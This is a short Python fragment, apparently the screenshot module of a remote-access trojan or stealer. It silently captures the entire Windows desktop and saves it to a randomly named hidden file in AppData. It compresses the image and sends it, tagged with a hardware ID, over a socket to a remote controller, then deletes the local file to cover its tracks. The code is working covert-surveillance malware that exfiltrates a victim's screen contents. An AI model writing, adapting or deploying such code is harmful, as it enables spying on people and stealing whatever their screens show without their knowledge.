from PIL import Image
import win32gui
import win32ui
import win32con
import win32api
import os
import random

name = ""
for i in range(5):
    name += str(random.randint(1, 9))


path = os.getenv("AppData") + f"\\.{name}.png"
hwin = win32gui.GetDesktopWindow()
width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
hwindc = win32gui.GetWindowDC(hwin)
srcdc = win32ui.CreateDCFromHandle(hwindc)
memdc = srcdc.CreateCompatibleDC()
png = win32ui.CreateBitmap()
png.CreateCompatibleBitmap(srcdc, width, height)
memdc.SelectObject(png)
memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
png.SaveBitmapFile(memdc, path)

foo = Image.open(path)
# foo = foo.resize((1920, 1080), Image.ANTIALIAS) # convert to 1920, 1080
foo.save(path, optimize=True, quality=10)

file = open(path, "rb").read()
send_info = str("screen " + str(len(file)) + " " + hwid).encode()

client.send(send_info)
client.send(file)

os.remove(path)
